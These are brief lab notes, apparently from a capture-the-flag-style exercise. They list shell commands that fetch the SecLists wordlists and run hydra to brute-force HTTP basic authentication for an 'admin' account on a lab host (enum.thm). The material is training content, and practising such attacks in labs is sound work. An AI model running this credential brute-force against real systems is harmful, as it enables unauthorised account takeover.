- load hydra:
- hydra -h
- └─$ curl -I http://enum.thm/labs/basic_auth/
- password list download:
- └─$ git clone https://github.com/danielmiessler/SecLists.git
- check the directory:
- └─$ ls ~/SecLists/Passwords/Common-Credentials/
- to get the directory:
- └─$ find ~/SecLists -name "500-worst-passwords.txt"                          
- final :
- └─$ hydra -l admin -P ~/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt enum.thm http-get /labs/basic_auth/

- <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/52649842-ccf0-42ce-9ee6-485f223d13c2" />

